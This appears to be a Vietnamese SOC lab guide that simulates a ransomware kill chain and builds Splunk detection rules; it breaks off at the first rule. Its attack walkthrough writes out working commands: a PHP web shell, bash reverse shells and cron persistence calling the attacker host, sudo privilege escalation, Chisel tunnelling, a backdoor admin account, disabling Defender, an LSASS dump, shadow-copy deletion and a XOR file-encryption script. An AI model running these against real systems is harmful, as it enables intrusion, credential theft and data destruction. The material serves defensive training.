---
title: "Tuần 5: Mô Phỏng Kịch Bản Tấn Công và Risk-Based Alerting"
last_modified: 2026-08-28
status: completed
author: "SOC Engineering và Detection Team"
tags:
 - cybersecurity
 - soc
 - detection-engineering
 - splunk
 - mitre-attack
 - blue-team
 - red-team
 - rba
 - ransomware
 - threat-hunting
aliases:
 - "SOC Lab Simulation Master Guide"
 - "Splunk Detection Engineering Master Guide"
 - "End-to-End Cyber Kill Chain: DMZ to Internal Ransomware"
 - "Week 5 Use Case và Detection Rules"
cssclasses:
 - dashboard
 - wide-page
---

# Tuần 5: Mô Phỏng Kịch Bản Tấn Công và Risk-Based Alerting
> **Kiến trúc mô phỏng chuỗi tấn công đa tầng (Multi-Stage Cyber Kill Chain) kết hợp kỹ thuật phát hiện dựa trên rủi ro (Risk-Based Alerting - RBA), phân tích chi tiết False Positive / False Negative, bằng chứng thực tế từ Splunk và hình ảnh trích xuất từ Lab.**

---

## 1. Tóm tắt kịch bản (Executive Summary và 5W1H)

!!! abstract "Tổng quan kịch bản"

    Kịch bản mô phỏng một cuộc tấn công mạng có chủ đích (Targeted Attack / Ransomware Operation) bắt đầu từ việc khai thác lỗ hổng upload trên ứng dụng web public-facing tại vùng DMZ, chiếm quyền root Linux, thiết lập kênh điều khiển ngầm (Reverse SOCKS5 Tunnel) để vượt qua phân vùng mạng, đánh cắp credential nội bộ, di chuyển ngang (Lateral Movement) sang máy chủ Windows Server 2022, vô hiệu hóa cơ chế phòng thủ Defender, trích xuất bộ nhớ LSASS, phá hủy bản sao lưu phục hồi (Volume Shadow Copies) và tiến hành mã hóa dữ liệu hàng loạt nhằm mục đích tống tiền kép (*Double Extortion*).


```mermaid
flowchart LR
    A["[1. Initial Access] \n Web Shell Upload và RCE"] --> B["[2. Persistence và PrivEsc] \n Cronjob và Sudo GTFOBins"]
    B --> C["[3. Defense Evasion và Tunnel] \n Chisel SOCKS5 và Socat Pivot"]
    C --> D["[4. Lateral Movement] \n WinRM và Rogue Admin Creation"]
    D --> E["[5. Credential Dumping] \n Defender Bypass và LSASS Dump"]
    E --> F["[6. Final Impact] \n VSS Deletion và XOR Encryption"]
    
```

![Sơ đồ Chuỗi Tấn công Đa tầng](assets/rules/attack_chain_diagram.png)
*Hình 1.1: Sơ đồ chuỗi tấn công đa tầng (Web Shell -> C2 Tunnel -> Lateral Movement -> Ransomware).* 

### Bảng phân tích 5W1H và Ma trận Chiến thuật

| Hạng mục | Chi tiết phân tích kỹ thuật |
| :--- | :--- |
| **What (Mô tả)** | Chuỗi tấn công hoàn chỉnh: **Initial Access $\rightarrow$ Execution $\rightarrow$ Persistence $\rightarrow$ Privilege Escalation $\rightarrow$ Credential Access $\rightarrow$ Defense Evasion $\rightarrow$ Lateral Movement $\rightarrow$ Impact**. |
| **Why (Mục tiêu)** | Tống tiền kép (*Double Extortion*): Chiếm đoạt dữ liệu máy chủ nội bộ, phá hủy cơ chế khôi phục dự phòng (Volume Shadow Copies) và mã hóa dữ liệu sản xuất. |
| **Who (Chủ thể)** | External Threat Actor / Ransomware Affiliate sử dụng kết hợp công cụ nguồn mở (*Chisel, Procdump, Evil-WinRM*) và kỹ thuật sống dựa vào tài nguyên có sẵn (*LOLBins / GTFOBins*). |
| **Where (Phạm vi)** | Vùng DMZ công khai (Web Server Ubuntu 22.04) $\rightarrow$ Vùng nội bộ Internal Restricted (Windows Server 2022, Active Directory Environment). |
| **When (Thời gian)** | Thời lượng diễn tập: **60 - 90 phút** (Mô phỏng chuỗi Dwell Time thực tế kéo dài từ vài ngày đến vài tuần). |
| **Prerequisites** | Lỗ hổng Upload file không kiểm duyệt, sai sót cấp quyền `sudo` (NOPASSWD GTFOBins), lộ lọt thông tin xác thực trong mã nguồn, Windows chưa bật LSA Protection/Credential Guard. |
| **Monitored Assets** | - `Web-Server-DMZ` (192.168.50.20 / 192.168.100.20 - `uf-ubuntu`)<br>- `Win-Server-Target` (192.168.100.30 - `WIN-I370HR7VSPS`)<br>- `Splunk-SIEM-Core` (192.168.100.10 - `splunk`) |
| **Log Sources** | `web_logs` (Apache access combined), `linux_security` (Linux auditd, auth.log), `windows_security` (EventCode 4624, 4720, 4732, 4688), `windows_sysmon` (EventCode 1, 3, 10, 11), `windows_logs` (Defender EventCode 5001, PowerShell 4104). |

### Bảng Ánh Xạ Chuỗi Tấn Công MITRE ATT&CK Toàn Diện

| STT | MITRE Tactic | MITRE Technique | Hành vi kỹ thuật cụ thể |
| :---: | :--- | :--- | :--- |
| **1** | `TA0001` (Initial Access) | `T1190` - Exploit Public App | Khai thác lỗ hổng Upload trên DVWA tải lên file `shell.php` |
| **2** | `TA0002` (Execution) | `T1505.003` - Web Shell | Gửi HTTP GET `shell.php?cmd=...` kích hoạt Reverse TCP Shell |
| **3** | `TA0003` (Persistence) | `T1053.003` - Cron | Đặt crontab kết nối reverse shell mỗi 5 phút dưới quyền `www-data` |
| **4** | `TA0004` (Privilege Escalation) | `T1548.003` - Sudo GTFOBins | Leo quyền root bằng lệnh `sudo find . -exec /bin/sh` (NOPASSWD) |
| **5** | `TA0006` (Credential Access) | `T1552.001` - Config File | Đọc `config.inc.php` trích xuất thông tin tài khoản dịch vụ `svc_backup` |
| **6** | `TA0011` (Command và Control) | `T1105` + `T1090` - Tool và Tunnel | Tải `chisel` về `/tmp` và mở Reverse SOCKS5 Tunnel |
| **7** | `TA0008` (Lateral Movement) | `T1021.006` - WinRM Remote | Kết nối `evil-winrm` sang Windows Server bằng `svc_backup` |
| **8** | `TA0003` (Persistence) | `T1136.001` - New Account | Tạo tài khoản ngầm `backdoor` và thêm vào `Administrators` |
| **9** | `TA0005` (Defense Evasion) | `T1562.001` - Defender Disable | Tắt Real-time Protection của Windows Defender (`Set-MpPreference`) |
| **10** | `TA0006` (Credential Access) | `T1003.001` - LSASS Dump | Tạo Windows Service chạy `procdump64.exe` dump bộ nhớ `lsass.exe` |
| **11** | `TA0040` (Impact) | `T1490` - Inhibit Recovery | Xóa Volume Shadow Copies qua `vssadmin delete shadows` |
| **12** | `TA0040` (Impact) | `T1486` - Data Encrypted | Chạy script mã hóa hàng loạt file `LabData` sang đuôi `.locked` |

---

## 2. Mô hình Lab và Kiến trúc mạng (Network Topology)

!!! warning "Nguyên tắc cách ly và Định tuyến (Routing Policy)"

    - **Máy tấn công (Kali Attacker)** chỉ kết nối trực tiếp được với máy chủ Web qua dải mạng DMZ (`192.168.50.0/24`).
    - **Không có kết nối trực tiếp** từ Kali đến mạng Internal (`192.168.100.0/24`). Bắt buộc kẻ tấn công phải triển khai kỹ thuật **Network Pivoting và Reverse Tunneling** qua máy chủ Web Server bị chiếm quyền.
    - **Splunk Server** đặt tại mạng quản trị/nội bộ, tiếp nhận log tập trung từ Universal Forwarder (UF) trên tất cả các node thông qua cổng TCP `9997`.


```mermaid
graph LR
    subgraph DMZ_Network ["Vùng DMZ (Host-Only: 192.168.50.0/24)"]
        KALI["Kali Linux (Attacker)\nIP: 192.168.50.100\nTools: Nmap, Chisel, Evil-WinRM"]
        WEB_NIC1["Web Server (NIC 1)\nIP: 192.168.50.20"]
    end

    subgraph Internal_Network ["Vùng Nội bộ Internal (Host-Only: 192.168.100.0/24)"]
        WEB_NIC2["Web Server (NIC 2)\nIP: 192.168.100.20\nDual-Homed Ubuntu 22.04"]
        WIN["Windows Server 2022 (Target)\nIP: 192.168.100.30\nSysmon + Splunk UF"]
        SPLUNK["Splunk Enterprise (SIEM Core)\nIP: 192.168.100.10\nIndexer và Search Head (Port 9997)"]
    end

    KALI -->|"1. HTTP Exploit / Reverse Shell"| WEB_NIC1
    WEB_NIC1 --- WEB_NIC2
    WEB_NIC2 -->|"2. Chisel Reverse SOCKS Tunnel"| KALI
    KALI -.->|"3. Pivoted WinRM / SMB Traffic"| WIN
    
    WEB_NIC2 -->|"Log Forwarding (TCP 9997)"| SPLUNK
    WIN -->|"Log Forwarding (TCP 9997)"| SPLUNK


```

![Mô hình Kiến trúc Mạng Lab](assets/rules/topology_overview.png)
*Hình 1.2: Sơ đồ kiến trúc mạng Lab thực nghiệm kết nối giữa Attacker, Web Server và Target Windows.*

### Danh mục máy ảo (Virtual Machine Matrix)

| Tên máy | Vai trò | Hệ điều hành | Cấu hình IP | Hostname Splunk | RAM | Thành phần cài đặt chính |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **Kali Attacker** | Máy tấn công | Kali Linux 2025.x | `192.168.50.100` (eth1) | - | 4 GB | Nmap, Chisel, Evil-WinRM, Python3 HTTP |
| **Web Server** | DMZ / Bàn đạp | Ubuntu 22.04 LTS | `192.168.50.20` / `192.168.100.20` | `uf-ubuntu` | 2 GB | Apache2, PHP, DVWA, Auditd, Splunk UF, Socat |
| **Windows Server** | Mục tiêu nội bộ | Windows Server 2022 | `192.168.100.30` | `WIN-I370HR7VSPS` | 4 GB | Active Directory/Local, Sysmon, Splunk UF, WinRM |
| **Splunk Server** | Hệ thống SIEM | Ubuntu 22.04 LTS | `192.168.100.10` | `splunk` | 8 GB | Splunk Enterprise 9.x / Enterprise Security |

---

## 3. Hướng dẫn thiết lập môi trường Lab (Lab Setup và Hardening)

### 3.1 Cấu hình Splunk Server (`192.168.100.10`)

```bash
# 1. Tải và cài đặt Splunk Enterprise
wget -O splunk.deb "https://download.splunk.com/products/splunk/releases/9.x.x/linux/splunk-9.x.x-linux-2.6-amd64.deb"
sudo dpkg -i splunk.deb

# 2. Khởi động và cấu hình nhận kết nối
sudo /opt/splunk/bin/splunk start --accept-license --answer-yes --no-prompt --seed-passwd 'Splunk@Admin2026!'
sudo /opt/splunk/bin/splunk enable boot-start
sudo /opt/splunk/bin/splunk enable listen 9997 -auth admin:'Splunk@Admin2026!'
```

Cấu hình tạo các index chuyên dụng tại `/opt/splunk/etc/system/local/indexes.conf`:

```ini
[web_logs]
homePath = $SPLUNK_DB/web_logs/db
coldPath = $SPLUNK_DB/web_logs/colddb
thawedPath = $SPLUNK_DB/web_logs/thaweddb

[linux_logs]
homePath = $SPLUNK_DB/linux_logs/db
coldPath = $SPLUNK_DB/linux_logs/colddb
thawedPath = $SPLUNK_DB/linux_logs/thaweddb

[linux_security]
homePath = $SPLUNK_DB/linux_security/db
coldPath = $SPLUNK_DB/linux_security/colddb
thawedPath = $SPLUNK_DB/linux_security/thaweddb

[windows_logs]
homePath = $SPLUNK_DB/windows_logs/db
coldPath = $SPLUNK_DB/windows_logs/colddb
thawedPath = $SPLUNK_DB/windows_logs/thaweddb

[windows_security]
homePath = $SPLUNK_DB/windows_security/db
coldPath = $SPLUNK_DB/windows_security/colddb
thawedPath = $SPLUNK_DB/windows_security/thaweddb

[windows_sysmon]
homePath = $SPLUNK_DB/windows_sysmon/db
coldPath = $SPLUNK_DB/windows_sysmon/colddb
thawedPath = $SPLUNK_DB/windows_sysmon/thaweddb
```

```bash
sudo /opt/splunk/bin/splunk restart
```

---

### 3.2 Cấu hình Web Server Linux (`192.168.50.20` / `192.168.100.20`)

```bash
# 1. Cài đặt Web Server và DVWA
sudo apt update && sudo apt install -y apache2 php libapache2-mod-php php-mysqli mysql-server auditd socat git
git clone https://github.com/digininja/DVWA.git /var/www/html/dvwa
sudo chown -R www-data:www-data /var/www/html/dvwa

# 2. Cài đặt Auditd Rules giám sát sâu
sudo tee /etc/audit/rules.d/soc-lab.rules <<'EOF'
## Giám sát ghi đè Cronjob (Persistence)
-w /etc/cron.d/ -p wa -k cron_file_write
-w /etc/crontab -p wa -k cron_file_write
-w /var/spool/cron/crontabs/ -p wa -k cron_file_write

## Giám sát thay đổi file cấu hình đặc quyền Sudo
-w /etc/sudoers -p wa -k sudo_change
-w /etc/sudoers.d/ -p wa -k sudo_change

## Giám sát đọc file cấu hình nhạy cảm
-w /var/www/html/dvwa/config/ -p r -k sensitive_config_read

## Giám sát thực thi lệnh và tạo kết nối mạng
-a always,exit -F arch=b64 -S execve -k exec_cmds
-a always,exit -F arch=b64 -S connect -k net_connect
EOF

sudo augenrules --load
sudo systemctl restart auditd

# 3. Tạo cấu hình leo quyền Sudoers (GTFOBins NOPASSWD find)
echo "www-data ALL=(ALL) NOPASSWD: /usr/bin/find" | sudo tee /etc/sudoers.d/lab-misconfig

# 4. Gài thông tin xác thực giả lập vào file config
echo "// LDAP_SVC_ACCOUNT=svc_backup / LDAP_SVC_PASS=P@ssw0rd2026!" | sudo tee -a /var/www/html/dvwa/config/config.inc.php
```

Cấu hình file `/opt/splunkforwarder/etc/system/local/inputs.conf`:

```ini
[monitor:///var/log/apache2/access.log]
disabled = false
index = web_logs
sourcetype = access_combined

[monitor:///var/log/audit/audit.log]
disabled = false
index = linux_security
sourcetype = auditd

[monitor:///var/log/auth.log]
disabled = false
index = linux_security
sourcetype = linux_secure
```

```bash
sudo /opt/splunkforwarder/bin/splunk restart
```

---

### 3.3 Cấu hình Windows Server 2022 (`192.168.100.30`)

```powershell
# 1. Cài đặt Sysmon với SwiftOnSecurity Config
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "C:\Sysmon.zip"
Expand-Archive C:\Sysmon.zip -DestinationPath C:\Sysmon
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" -OutFile "C:\Sysmon\config.xml"
C:\Sysmon\Sysmon64.exe -accepteula -i C:\Sysmon\config.xml

# 2. Bật Advanced Audit Policy (Logon và Process Creation with CommandLine)
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"User Account Management" /success:enable /failure:enable
auditpol /set /subcategory:"Security Group Management" /success:enable /failure:enable
auditpol /set /subcategory:"Process Creation" /success:enable
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f

# 3. Kích hoạt dịch vụ WinRM cho phép quản trị từ xa
Enable-PSRemoting -Force
winrm quickconfig -force

# 4. Khởi tạo tài khoản dịch vụ mục tiêu
$secPass = ConvertTo-SecureString "P@ssw0rd2026!" -AsPlainText -Force
New-LocalUser -Name "svc_backup" -Password $secPass -Description "Internal Backup Service Account"
Add-LocalGroupMember -Group "Administrators" -Member "svc_backup"

# 5. Tạo dữ liệu giả lập nạn nhân (Target Corporate Files)
New-Item -ItemType Directory -Path "C:\Users\Public\LabData" -Force
1..30 | ForEach-Object { 
    Set-Content -Path "C:\Users\Public\LabData\financial_report_$_.txt" -Value "Confidential Company Financial Record #$_ - Strict Internal Use Only"
}
```

![Tạo thư mục và file dữ liệu mô phỏng LabData](assets/Script/8_creat_window_folder_file.png)
*Hình 2.1: Khởi tạo thư mục và tệp tin dữ liệu mô phỏng LabData trên Windows Server.*

Cấu hình file `C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf`:

```ini
[WinEventLog://Security]
disabled = 0
index = windows_security

[WinEventLog://Microsoft-Windows-Sysmon/Operational]
disabled = 0
index = windows_sysmon

[WinEventLog://System]
disabled = 0
index = windows_logs

[WinEventLog://Microsoft-Windows-PowerShell/Operational]
disabled = 0
index = windows_logs

[WinEventLog://Microsoft-Windows-Windows Defender/Operational]
disabled = 0
index = windows_logs
```

---

### 3.4 Chuẩn bị công cụ trên Kali Attacker (`192.168.50.100`)

```bash
# 1. Cấu hình IP và thư mục công cụ
sudo ip addr add 192.168.50.100/24 dev eth1 2>/dev/null || true
mkdir -p ~/soc_tools && cd ~/soc_tools

# 2. Tải Chisel và ProcDump
wget https://github.com/jpillora/chisel/releases/download/v1.10.0/chisel_1.10.0_linux_amd64.gz -O chisel.gz
gunzip chisel.gz && mv chisel_1.10.0_linux_amd64 chisel && chmod +x chisel
wget https://live.sysinternals.com/procdump64.exe -O procdump64.exe

# 3. Khởi chạy HTTP Server phục vụ tải payload
python3 -m http.server 8000
```

![Cấu hình IP Kali Attacker](assets/Script/1_ip_kali.png)
*Hình 3.1: Xác thực cấu hình địa chỉ IP máy tính tấn công Kali Linux.*
![Mở Python HTTP server trên Kali](assets/Script/15_open_port_to_download.png)
*Hình 3.2: Khởi động dịch vụ HTTP Server trên Kali Linux để phát tán payload.*

---

## 4. Chuỗi Tấn Công Chi Tiết và Bằng Chứng Thực Tế (Step-by-Step Attack Execution)

```mermaid
sequenceDiagram
    autonumber
    actor Attacker as Kali (192.168.50.100)
    participant Web as Web Server (DMZ / Internal)
    participant Win as Windows Target (192.168.100.30)
    participant SIEM as Splunk SIEM (192.168.100.10)

    Attacker->>Web: Reconnaissance (Nmap / Nikto)
    Attacker->>Web: Upload PHP Web Shell và Trigger RCE
    Web-->>Attacker: Reverse Shell Connection (Port 4444)
    Attacker->>Web: Persistence (Crontab) và Sudo find (PrivEsc to Root)
    Attacker->>Web: Extract Credentials (config.inc.php)
    Attacker->>Web: Transfer và Start Chisel SOCKS Tunnel
    Attacker->>Win: Port Scan và Evil-WinRM Login (as svc_backup)
    Attacker->>Win: Create Rogue Admin 'backdoor'
    Attacker->>Win: Disable Defender và Dump LSASS via Procdump
    Attacker->>Win: Delete VSS Shadows (vssadmin) và XOR File Encryption
    Web-->>SIEM: Stream Auditd và Apache Web Logs
    Win-->>SIEM: Stream Sysmon và Windows Security Events
```

---

### Bước 1: Trinh sát mục tiêu công khai (Reconnaissance)
- **MITRE ATT&CK**: `T1595.002` (Active Scanning: Vulnerability Scanning)
- **Mục tiêu**: Xác định các cổng mở, phiên bản dịch vụ Web Apache/PHP và các endpoint upload có thể khai thác.
- **Lệnh thực thi trên Kali**:
```bash
nmap -sV -sC -p 80,443 192.168.50.20
nikto -h http://192.168.50.20/dvwa/
```

![Nmap quét dải mạng DMZ](assets/Script/2_nmap_subnet.png)
*Hình 4.1: Quét thăm dò dải mạng DMZ bằng công cụ Nmap từ Kali Linux.*
![Nmap quét dịch vụ Web Server Apache](assets/Script/3_nmap_victim_apache.png)
*Hình 4.2: Quét chi tiết các dịch vụ đang mở trên máy chủ mục tiêu Ubuntu Web Server.*

---

### Bước 2: Khai thác Upload và Kích hoạt Web Shell RCE (Initial Access và Execution)
- **MITRE ATT&CK**: `T1190` (Exploit Public-Facing App), `T1505.003` (Server Software Component: Web Shell), `T1059.004` (Unix Shell)
- **Mục tiêu**: Vượt qua bộ lọc upload trên DVWA (Security = Low), tải lên `shell.php` và kích hoạt reverse shell tương tác về Kali qua port 4444.

![Giao diện Web Server DVWA](assets/Script/4_apache_server.png)
*Hình 4.3: Truy cập giao diện ứng dụng web dễ bị tổn thương DVWA trên Web Server.*
![Cấu hình DVWA Security Low](assets/Script/5_low_security.png)
*Hình 4.4: Thiết lập mức độ bảo mật ứng dụng về Low trong cài đặt DVWA.*

1. **Chuẩn bị payload `shell.php`**:
```php
<?php 
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

![Upload file shell.php lên DVWA](assets/Script/6_upload_file_shell.png)
*Hình 4.5: Khai thác lỗ hổng File Upload tải tệp mã độc shell.php lên máy chủ.*
![Kiểm tra đường dẫn file shell.php](assets/Script/7_check_shell.png)
*Hình 4.6: Kiểm tra đường dẫn lưu trữ tệp shell.php trong thư mục hackable/uploads.*

2. **Lắng nghe kết nối trên Kali**:
```bash
nc -lvnp 4444
```

![Mở Netcat listener port 4444](assets/Script/9_nc_port.png)
*Hình 4.7: Mở cổng lắng nghe Netcat listener trên cổng 4444 của Kali Linux.*

3. **Kích hoạt reverse TCP shell qua HTTP GET request**:
```bash
curl -G "http://192.168.50.20/dvwa/hackable/uploads/shell.php" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/192.168.50.100/4444 0>&1'"
```

![Gửi request curl kích hoạt Reverse TCP Shell](assets/Script/10_curl_shell.png)
*Hình 4.8: Kích hoạt Reverse TCP Shell thông qua yêu cầu HTTP cURL.*
![Nhận Reverse Shell www-data trên Kali](assets/Script/11_ip_shell_apache.png)
*Hình 4.9: Nhận thành công phiên tương tác Reverse Shell dưới danh tính www-data.*

---

### Bước 3: Thiết lập duy trì truy cập bằng Cronjob (Persistence)
- **MITRE ATT&CK**: `T1053.003` (Scheduled Task/Job: Cron)
- **Mục tiêu**: Cài đặt một cron job tự động kết nối reverse shell về Kali mỗi 5 phút dưới quyền tài khoản `www-data`.
- **Lệnh thực thi trên Web Shell**:
```bash
(crontab -l 2>/dev/null; echo "*/5 * * * * bash -i >& /dev/tcp/192.168.50.100/4444 0>&1") | crontab -
```

---

### Bước 4: Leo thang đặc quyền Root qua Sudo GTFOBins (Privilege Escalation)
- **MITRE ATT&CK**: `T1548.003` (Abuse Elevation Control Mechanism: Sudo)
- **Mục tiêu**: Khai thác cấu hình `sudoers` cho phép tài khoản `www-data` thực thi lệnh `find` với quyền root không cần mật khẩu (`NOPASSWD`).
- **Lệnh thực thi trên Web Shell**:
```bash
sudo -l
sudo /usr/bin/find . -exec /bin/sh \; -quit
```

---

### Bước 5: Thu thập Credential từ file cấu hình nội bộ (Credential Access)
- **MITRE ATT&CK**: `T1552.001` (Unsecured Credentials: Credentials In Files)
- **Mục tiêu**: Khám phá các host lân cận qua bảng ARP cache (`ip neigh`) và đọc file cấu hình web server để tìm thông tin tài khoản dịch vụ Active Directory / Windows.
- **Lệnh thực thi (Root)**:
```bash
ip neigh
cat /var/www/html/dvwa/config/config.inc.php | grep -i "svc_"
# Output: // LDAP_SVC_ACCOUNT=svc_backup / LDAP_SVC_PASS=P@ssw0rd2026!
```

![Kiểm tra thông tin mạng nội bộ qua ARP/IP Neigh](assets/Script/12_ip_neigh.png)
*Hình 4.10: Thu thập thông tin mạng nội bộ và các nút láng giềng qua ip neigh.*
![Đọc trộm file config.inc.php lấy credential svc_backup](assets/Script/14_show_config_dvwa_account.png)
*Hình 4.11: Đọc tệp cấu hình config.inc.php trích xuất thông tin đăng nhập svc_backup.*

---

### Bước 6: Mở kênh Reverse SOCKS Tunnel qua Chisel (Defense Evasion và Tunneling)
- **MITRE ATT&CK**: `T1105` (Ingress Tool Transfer), `T1090.001` (Proxy: Internal Proxy)
- **Mục tiêu**: Tải binary `chisel` vào thư mục `/tmp` trên Web Server và thiết lập reverse SOCKS5 proxy về máy Kali để định tuyến traffic vào mạng nội bộ.

1. **Trên Kali Attacker (Mở Chisel Server)**:
```bash
./chisel server --reverse -p 8080
```

![Khởi chạy Chisel server trên Kali](assets/Script/17_chisel_open_port.png)
*Hình 4.12: Khởi chạy dịch vụ Chisel Server trên cổng 8000 của Kali Linux.*

2. **Trên Web Server (Chạy Chisel Client kết nối ngược)**:
```bash
wget http://192.168.50.100:8000/chisel -O /tmp/chisel
chmod +x /tmp/chisel
/tmp/chisel client 192.168.50.100:8080 R:1080:socks &
```

![Tải Chisel binary về Web Server](assets/Script/16_download_chisel.png)
*Hình 4.13: Tải tệp thực thi Chisel client về máy chủ web Ubuntu.*
![Kết nối Chisel client mở Reverse SOCKS5 Proxy](assets/Script/18_connected_chisel_dvwa_apache.png)
*Hình 4.14: Thiết lập đường hầm Reverse SOCKS5 Proxy kết nối ngược về Kali.*

---

### Bước 7: Dò quét mạng nội bộ và Port Forwarding (Internal Discovery và Pivoting)
- **MITRE ATT&CK**: `T1046` (Network Service Discovery)
- **Mục tiêu**: Quét kiểm tra cổng WinRM (`5985`) và SMB (`445`) trên máy chủ `192.168.100.30`, sau đó dùng `socat` mở port forwarding trên port `5555`.

1. **Quét cổng qua proxychains trên Kali**:
```bash
proxychains nmap -sT -Pn -p 5985,445,3389 192.168.100.30
```

![Quét nmap qua Proxychains tới Windows Server](assets/Script/13_proxychain_nmap_target_window.png)
*Hình 4.15: Quét cổng máy chủ Windows Server thông qua Proxychains và SOCKS5 tunnel.*

2. **Thiết lập Port Forwarding qua `socat` trên Web Server**:
```bash
socat TCP-LISTEN:5555,fork,reuseaddr TCP:192.168.100.30:5985 &
```

![Khởi chạy Socat Port Forwarding cổng 5555](assets/Script/19_open_port_window.png)
*Hình 4.16: Cấu hình Socat Port Forwarding chuyển tiếp lưu lượng cổng WinRM 5985 sang 5555.*
![Kiểm tra kết nối WinRM qua socat port 5555](assets/Script/20_connect_port_window_rm.png)
*Hình 4.17: Kiểm tra kết nối dịch vụ WinRM thông qua cổng trung gian 5555.*

---

### Bước 8: Di chuyển ngang và Tạo tài khoản quản trị dự phòng (Lateral Movement và Persistence)
- **MITRE ATT&CK**: `T1021.006` (Remote Services: Windows Remote Management), `T1136.001` (Create Account: Local Account)
- **Mục tiêu**: Đăng nhập WinRM vào máy chủ Windows bằng tài khoản `svc_backup`, kiểm tra đặc quyền và tạo tài khoản local backdoor thêm vào nhóm `Administrators`.

1. **Kết nối Evil-WinRM từ Kali**:
```bash
evil-winrm -i 192.168.50.20 -u svc_backup -p 'P@ssw0rd2026!' -P 5555
```

![Đăng nhập Evil-WinRM bằng tài khoản svc_backup](assets/Script/21_login_acc_window_rm.png)
*Hình 4.18: Đăng nhập từ xa thành công vào Windows Server bằng Evil-WinRM với tài khoản svc_backup.*
![Kiểm tra hostname và IP Windows Server](assets/Script/22_check_host_ip.png)
*Hình 4.19: Xác nhận danh tính máy chủ Windows Server (WIN-I370HR7VSPS và IP 192.168.100.20).*
![Kiểm tra whoami /all và đặc quyền Administrator](assets/Script/23_whoami_all.png)
*Hình 4.20: Kiểm tra đặc quyền tài khoản và quyền hạn thành viên Administrators.*

2. **Thực thi trên Remote PowerShell**:
```powershell
net user backdoor P@ssw0rd123! /add
net localgroup Administrators backdoor /add
```

![Tạo tài khoản ngầm backdoor và thêm vào Administrators](assets/Script/24_netuser_group.png)
*Hình 4.21: Tạo tài khoản ngầm backdoor và thêm vào nhóm quản trị viên cục bộ.*

---

### Bước 9: Tắt cơ chế phòng thủ và Trích xuất bộ nhớ LSASS (Defense Evasion và Cred Dump)
- **MITRE ATT&CK**: `T1562.001` (Impair Defenses: Disable or Modify Tools), `T1003.001` (OS Credential Dumping: LSASS Memory)
- **Mục tiêu**: Tắt tính năng Realtime Protection của Windows Defender và tạo Windows Service để chạy `procdump64.exe` trích xuất `lsass.exe` dưới quyền `NT AUTHORITY\SYSTEM`.

```powershell
# 1. Tắt cơ chế quét thời gian thực của Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true

# 2. Tải ProcDump từ máy chủ Kali
Invoke-WebRequest -Uri "http://192.168.50.100:8000/procdump64.exe" -OutFile "C:\Windows\Temp\procdump64.exe"

# 3. Tạo và kích hoạt Service dump LSASS
sc.exe create DumpService binPath= "cmd /c C:\Windows\Temp\procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp" type= own
sc.exe start DumpService
```

![Tắt Defender và tạo DumpService trích xuất LSASS](assets/Script/25_creat_dump_backdoor.png)
*Hình 4.22: Vô hiệu hóa Microsoft Defender và tạo service trích xuất bộ nhớ tiến trình LSASS.*

---

### Bước 10: Phá hủy Volume Shadow Copies và Mô phỏng mã hóa tống tiền (Impact)
- **MITRE ATT&CK**: `T1490` (Inhibit System Recovery), `T1486` (Data Encrypted for Impact)
- **Mục tiêu**: Xóa toàn bộ điểm khôi phục hệ thống (VSS) nhằm triệt tiêu khả năng cứu dữ liệu, sau đó thực thi script PowerShell mã hóa toàn bộ file trong `C:\Users\Public\LabData` bằng thuật toán XOR byte và đổi phần mở rộng thành `.locked`.

![Trạng thái file trước khi bị mã hóa](assets/Script/26_before_encrypted.png)
*Hình 4.23: Trạng thái nguyên vẹn của các tệp tin dữ liệu trước khi mã hóa tống tiền.*

```powershell
# 1. Xóa sạch Volume Shadow Copies
vssadmin delete shadows /all /quiet

# 2. Thực thi mã hóa tống tiền mô phỏng (XOR Byte Encryption)
$key = 0xAB
Get-ChildItem -Path "C:\Users\Public\LabData" -Recurse -File | ForEach-Object {
    $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
    $enc = [byte[]]($bytes | ForEach-Object { $_ -bxor $key })
    [System.IO.File]::WriteAllBytes("$($_.FullName).locked", $enc)
    Remove-Item -Path $_.FullName -Force
}
```

![Trạng thái file sau khi bị mã hóa đổi đuôi .locked](assets/Script/27_after_encrypted.png)
*Hình 4.24: Toàn bộ tệp tin trong thư mục dữ liệu bị mã hóa và đổi phần mở rộng thành .locked.*

---

## 5. Bộ Quy Tắc Phát Hiện Splunk SIEM Chuẩn Hóa (12 Detection Rules)

!!! tip "Chuẩn hóa Splunk SPL kết hợp Kiểm chứng Thực tế trên Splunk MCP Server"

    Tất cả các luật phát hiện dưới đây đã được kiểm tra trực tiếp trên môi trường Splunk Lab thực tế (`host: uf-ubuntu` và `host: WIN-I370HR7VSPS`).


---

### Rule 01: Web Shell RCE và Malicious URI Query Execution

![Rule 1 Splunk SPL Query](assets/rules/rule01_webshell_spl.png)
*Hình 5.1a: Cú pháp truy vấn Splunk SPL phát hiện Web Shell RCE.*
![Rule 1 Splunk Kết Quả Tìm Kiếm Thực Tế](assets/rules/rule01_results.png)
*Hình 5.1b: Kết quả bắt được 52 sự kiện truy vấn shell.php trên Splunk.*

??? note "Metadata Box"

    - **MITRE ATT&CK**: `T1190` (Exploit Public-Facing App), `T1505.003` (Web Shell)
    - **Data Source**: `index=web_logs` (Apache / Nginx Access Logs)
    - **Pyramid of Pain**: ==Host Artifacts / Tools==
    - **Risk Weight**: **20**
    - **Kiểm chứng Splunk Lab**: Bắt chính xác **52 sự kiện** trên `host=uf-ubuntu` từ `clientip=192.168.50.100` gọi tới `/dvwa/hackable/uploads/shell.php`.


#### Kỹ thuật phân tích và Logic phát hiện
- `urldecode(urldecode(uri_query))`: Giải mã 2 lần (double-decode) để vô hiệu hóa kỹ thuật né tránh kiểm duyệt URL encoding.
